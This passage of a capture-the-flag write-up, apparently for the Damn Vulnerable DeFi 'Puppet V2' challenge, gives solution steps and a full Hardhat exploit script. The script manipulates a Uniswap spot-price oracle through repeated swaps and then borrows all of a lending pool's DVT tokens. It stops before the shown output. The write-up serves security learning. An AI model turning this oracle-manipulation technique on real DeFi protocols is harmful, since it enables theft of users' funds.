+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>price = (amount * reservesWETH / reservesToken) * 3
+</span></span><span style="display:flex;"><span>price = (1000000 * 10 / 100) * 3 = 300000</span></span></code></pre></td></tr></table>
+</div>
+</div>
+<h2 id="3-solution">3) Solution</h2>
+<p>To reduce the <code>DVT</code> price, I used the following approach:</p>
+<ol>
+<li>sell all the <code>DVT</code> for <code>WETH</code> (this increases the <code>DVT</code> amount) by calling <code>swapExactTokensForTokens</code></li>
+<li>sell all our <code>ETH</code> for <code>DVT</code> by calling <code>swapExactETHForTokens</code></li>
+<li>sell the <code>DVT</code> for <code>WETH</code> by calling <code>swapExactTokensForTokens</code> (this increases the <code>DVT</code> amount)</li>
+<li>borrow the <code>1000000 DVT</code> (that will cost <code>~29.6 WETH</code>)</li>
+</ol>
+<p><code>puppetv2.challenge.js</code>:
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">50
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">51
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">75
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">76
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">77
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">78
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">79
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">80
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">81
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">82
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">83
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span>    <span style="color:#000">it</span>(<span style="color:#5a2">&#39;Exploit&#39;</span>, <span style="color:#00f">async</span> <span style="color:#00f">function</span> () {
+</span></span><span style="display:flex;"><span>        <span style="color:#888;font-style:italic">/** CODE YOUR EXPLOIT HERE */</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">provider</span> = <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">deadline</span> = (<span style="color:#00f">await</span> <span style="color:#000">ethers</span>.<span style="color:#000">provider</span>.<span style="color:#000">getBlock</span>(<span style="color:#5a2">&#39;latest&#39;</span>)).<span style="color:#000">timestamp</span> * <span style="color:#3af">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">function</span> <span style="color:#000">formatOutput</span>(<span style="color:#000">val</span>){
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">return</span> <span style="color:#000">parseFloat</span>(<span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">formatEther</span>(<span style="color:#000">val</span>)).<span style="color:#000">toFixed</span>(<span style="color:#3af">3</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">async</span> <span style="color:#00f">function</span> <span style="color:#000">logData</span>() {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">let</span> <span style="color:#000">row1</span> = {
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;pool DVT&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;pool WETH&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;pool balance&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;attacker DVT&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;attacker WETH&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">balanceOf</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;attacker balance&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;exchange DVT&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;exchange WETH&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">balanceOf</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">address</span>)),
+</span></span><span style="display:flex;"><span>                <span style="color:#5a2">&#34;exchange balance&#34;</span>: <span style="color:#000">formatOutput</span>(<span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapExchange</span>.<span style="color:#000">address</span>))
+</span></span><span style="display:flex;"><span>            };
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">let</span> <span style="color:#000">depositRequired</span> = <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">calculateDepositOfWETHRequired</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>            <span style="color:#000">console</span>.<span style="color:#000">table</span>([<span style="color:#000">row1</span>]);
+</span></span><span style="display:flex;"><span>            <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">`[+] Deposit required to borrow </span><span style="color:#5a2">${</span><span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">formatEther</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> DVT: </span><span style="color:#5a2">${</span><span style="color:#000">formatOutput</span>(<span style="color:#000">depositRequired</span>)<span style="color:#5a2">}</span><span style="color:#5a2"> WETH\n`</span>)
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">&#34;0) Initial setup&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">&#34;1) swap all DVT for WETH&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">approve</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapRouter</span>.<span style="color:#000">address</span>, <span style="color:#000">ATTACKER_INITIAL_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>        
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">uniswapRouter</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">swapExactTokensForTokens</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">ATTACKER_INITIAL_TOKEN_BALANCE</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#3af">0</span>,
+</span></span><span style="display:flex;"><span>            [<span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">address</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#000">attacker</span>.<span style="color:#000">address</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">deadline</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">&#34;2) swap all ETH for DVT&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">ATTACKER_BALANCE</span> = <span style="color:#00f">await</span> <span style="color:#000">provider</span>.<span style="color:#000">getBalance</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">uniswapRouter</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">swapExactETHForTokens</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#3af">0</span>,                                                          
+</span></span><span style="display:flex;"><span>            [<span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">address</span>],                   
+</span></span><span style="display:flex;"><span>            <span style="color:#000">attacker</span>.<span style="color:#000">address</span>,                                           
+</span></span><span style="display:flex;"><span>            <span style="color:#000">deadline</span>,   
+</span></span><span style="display:flex;"><span>            { <span style="color:#000">value</span>: <span style="color:#000">ATTACKER_BALANCE</span>.<span style="color:#000">sub</span>(<span style="color:#000">ethers</span>.<span style="color:#000">utils</span>.<span style="color:#000">parseEther</span>(<span style="color:#5a2">&#39;0.1&#39;</span>)) }
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">&#34;3) swap all DVT for WETH&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">const</span> <span style="color:#000">ATTACKER_TOKEN_BALANCE</span> = <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">balanceOf</span>(<span style="color:#000">attacker</span>.<span style="color:#000">address</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">approve</span>(<span style="color:#00f">this</span>.<span style="color:#000">uniswapRouter</span>.<span style="color:#000">address</span>, <span style="color:#000">ATTACKER_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">uniswapRouter</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">swapExactTokensForTokens</span>(
+</span></span><span style="display:flex;"><span>            <span style="color:#000">ATTACKER_TOKEN_BALANCE</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#3af">0</span>,
+</span></span><span style="display:flex;"><span>            [<span style="color:#00f">this</span>.<span style="color:#000">token</span>.<span style="color:#000">address</span>, <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">address</span>],
+</span></span><span style="display:flex;"><span>            <span style="color:#000">attacker</span>.<span style="color:#000">address</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#000">deadline</span>
+</span></span><span style="display:flex;"><span>        )
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#000">console</span>.<span style="color:#000">log</span>(<span style="color:#5a2">&#34;4) borrow DVT&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">let</span> <span style="color:#000">depositRequired</span> = <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">calculateDepositOfWETHRequired</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">weth</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">approve</span>(<span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">address</span>, <span style="color:#000">depositRequired</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#00f">this</span>.<span style="color:#000">lendingPool</span>.<span style="color:#000">connect</span>(<span style="color:#000">attacker</span>).<span style="color:#000">borrow</span>(<span style="color:#000">POOL_INITIAL_TOKEN_BALANCE</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">await</span> <span style="color:#000">logData</span>.<span style="color:#000">call</span>(<span style="color:#00f">this</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    });</span></span></code></pre></td></tr></table>
+</div>
+</div></p>
+<p>I added some log information to keep track of the different balances. The following is the output obtained from running the above code:</p>
+<div class="highlight"><div style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
+</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
